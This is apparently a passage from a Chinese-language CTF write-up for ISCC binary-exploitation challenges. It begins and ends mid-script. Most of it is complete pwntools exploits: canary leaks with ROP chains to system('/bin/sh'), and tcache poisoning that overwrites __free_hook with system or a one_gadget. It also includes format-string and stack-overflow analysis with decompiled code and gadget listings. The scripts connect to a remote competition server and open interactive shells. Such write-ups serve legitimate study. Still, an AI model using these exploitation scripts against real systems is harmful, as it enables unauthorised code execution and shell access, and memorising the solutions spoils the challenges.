<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>():</span><br><span class="line">    ru(<span class="string">b&quot;size:&quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;flag:&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">main = <span class="number">0x40135c</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004014c3</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">welcome()</span><br><span class="line">ru(<span class="string">b&quot;welcome to ISCC&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x16</span> + <span class="string">b&#x27;bb&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;bb&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment">#canary = r(7)#b&#x27;\x97\x11\xa8\xf2&lt;\xe6\xb6&#x27;</span></span><br><span class="line">canary_leak = r(<span class="number">7</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span>+canary_leak)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(canary) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">sl(payload)</span><br><span class="line">puts = l64()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">libc_base = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;welcome to ISCC&quot;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;le0n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(canary) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line">ru(<span class="string">b&#x27;nice to meet you&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="《魔导王的秘密》"><a href="#《魔导王的秘密》" class="headerlink" title="《魔导王的秘密》"></a>《魔导王的秘密》</h2><p>glibc2.27</p>
<p>tcache_poisoning分配到free_hook，改free_hook为one_gadget</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-04 09:57:00</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">12700</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">lg      = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;Chant your choice:&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Celestial alignment coordinate:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&quot;Quantum essence required:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Cursed sanctum to cleanse:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Sanctum for arcane inscription:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&quot;Runic sequence length:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&quot;Inscribe your primordial truth:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Sanctum to reveal cosmic truth:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">##leak libc</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">libc_base = l64() - <span class="number">0x3ebca0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"><span class="comment">##leak heap</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">heap = p.recv(<span class="number">6</span>)</span><br><span class="line">heap_addr = u64(heap.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;heap_addr&#x27;</span>,heap_addr)</span><br><span class="line">top_chunk = heap_addr + <span class="number">0x50</span></span><br><span class="line">lg(<span class="string">&#x27;top_chunk&#x27;</span>,top_chunk)</span><br><span class="line"><span class="comment">##</span></span><br><span class="line">one = [<span class="number">0x4f29e</span>,<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">og = libc_base + one[<span class="number">2</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;free_hook&#x27;</span>,free_hook)</span><br><span class="line">lg(<span class="string">&#x27;og&#x27;</span>,og)</span><br><span class="line"><span class="comment">## tcache_poisoning</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x10</span>,p64(og))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="genius"><a href="#genius" class="headerlink" title="genius"></a>genius</h2><p>function3()中栈溢出</p>
<p>思路：</p>
<ul>
<li>绕过没用的东西</li>
<li>进入function3()，read()中读入覆盖canary的低字节，printf()泄露出来</li>
<li>gets()溢出，rop</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># time: 2025-05-10 09:23:13</span></span><br><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">import <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">context</span>.<span class="title">terminal</span> =</span> [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">12000</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="meta"># libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span></span><br><span class="line"><span class="meta"># gdb.attach(p,gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span></span><br><span class="line"><span class="meta"># b *0x000000000040120F</span></span><br><span class="line"># <span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s       = lambda data               :p.send(data)</span><br><span class="line">sa      = lambda delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :p.sendline(data)</span><br><span class="line">sla     = lambda delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = lambda num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = lambda                    :p.recvline()</span><br><span class="line">ru      = lambda delims             :p.recvuntil(delims)</span><br><span class="line">itr     = lambda                    :p.interactive()</span><br><span class="line">leak    = lambda name, addr         :<span class="built_in">log</span>.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.format(name, addr))</span><br><span class="line">hs256   = lambda data               :sha256(str(data).encode()).hexdigest()</span><br><span class="line">l32     = lambda                    :u32(p.recvuntil(b<span class="string">&quot;\xf7&quot;</span>)[<span class="number">-4</span>:].ljust(<span class="number">4</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l64     = lambda                    :u64(p.recvuntil(b<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = lambda                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">int16   = lambda data               :<span class="type">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">sla(b<span class="string">&quot;,yes or no?&quot;</span>,b<span class="string">&quot;no&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;don&#x27;t be so modest.&quot;</span>,b<span class="string">&quot;thanks&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(b<span class="string">&quot;what you want in init&quot;</span>)</span><br><span class="line">payload = b<span class="string">&quot;a&quot;</span>*<span class="number">0x16</span> + b<span class="string">&quot;bb&quot;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(b<span class="string">&quot;bb\n&quot;</span>)</span><br><span class="line">canary = uu64(r(<span class="number">7</span>)) &lt;&lt; <span class="number">8</span></span><br><span class="line">leak(<span class="string">&quot;canary&quot;</span>,canary)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x401050</span></span><br><span class="line">bin_sh = <span class="number">0x402004</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004013f3</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + p64(canary) + p64(<span class="number">0</span>) +p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line">sla(b<span class="string">&quot;thank you&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="program"><a href="#program" class="headerlink" title="program"></a>program</h2><p>glibc2.31 </p>
<p>uaf，堆溢出，增删改查都有</p>
<p>思路：</p>
<ul>
<li>先free一个chunk进入unsortedbin，泄露canary</li>
<li>tcache_poisoning申请到free_hook</li>
<li>改free_hook为system，free一个chunk即可get shell</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-10 09:50:26</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>,<span class="number">12300</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># gdbscript = &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;choice:&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    sla(menu,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,length,data</span>):</span><br><span class="line">    sla(menu,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&quot;length:&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    sla(<span class="string">b&quot;content:&quot;</span>,data)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">libc_base = l64() - <span class="number">0x1ecbe0</span></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">og = libc_base + one[<span class="number">1</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x20</span>,p64(system))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="Fufu"><a href="#Fufu" class="headerlink" title="Fufu"></a>Fufu</h2><p>保护全开</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ctf @ 51e4c2a03f9c in ~/pwn [0:52:46]</span></span><br><span class="line">$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/ctf/pwn/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctf @ 51e4c2a03f9c in ~/pwn [0:52:51]</span></span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<p>分析程序：</p>
<p>这道题给出了一个菜单，有两个函数，分析如下：</p>
<h3 id="submit-evidence"><a href="#submit-evidence" class="headerlink" title="submit_evidence()"></a>submit_evidence()</h3><p>ida中反编译的伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">submit_evidence</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-54h] BYREF</span></span><br><span class="line">  <span class="type">char</span> nbytes_4[<span class="number">72</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Furina: Time is limited! &gt;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10</span> * nbytes &lt;= <span class="number">0x40</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Furina: Present your evidence! &gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, nbytes_4, nbytes);</span><br><span class="line">    <span class="built_in">printf</span>(nbytes_4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hcy want to eat chicken! &gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, nbytes_4, nbytes);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Furina: Mortal evidence should be concise!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有三次输入：</p>
<ul>
<li>第一次输入的时候，程序进行了判断 10*input &lt;&#x3D; 0x40 ,所以必须小于7</li>
<li>第二次输入，可以明显的发现是格式化字符串漏洞</li>
<li>第三次输入目前看来用处不大</li>
</ul>
<h3 id="trial-adjourned"><a href="#trial-adjourned" class="headerlink" title="trial_adjourned()"></a>trial_adjourned()</h3><p>伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">trial_adjourned</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">72</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Furina: The trial is adjourned&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x80u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显的栈溢出</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先找一个gadgets，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fufu/ $ ROPgadget --binary ./pwn --only <span class="string">&quot;pop|ret&quot;</span>                                                       </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000001332 : pop r15 ; ret</span><br><span class="line">0x0000000000001183 : pop rbp ; ret</span><br><span class="line">0x000000000000132f : pop rdi ; ret &lt;=== 选择这个</span><br><span class="line">0x0000000000001331 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000000101a : ret  &lt;=== 和这个</span><br><span class="line">0x0000000000001219 : ret 0x8d48</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 6</span><br></pre></td></tr></table></figure>

<p>明确了有格式化字符串漏洞和栈溢出，并且前者可重复利用，fmt+ret2libc</p>
<p>思路：</p>
<ul>
<li>通过两次格式化字符串，来泄露canary和程序基址（此处泄露的main）</li>
<li>通过2中的栈溢出泄露地址，并在该<a href="libc.rip">网站</a>上查到system，bin_sh偏移</li>
<li>再让程序返回到输入这里，再次利用栈溢出来get_shell</li>
<li>注意：这道题glibc是2.34版本的，存在栈平衡检查，在调用system时要多加一个ret</li>
</ul>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-13 10:16:52</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">12600</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span 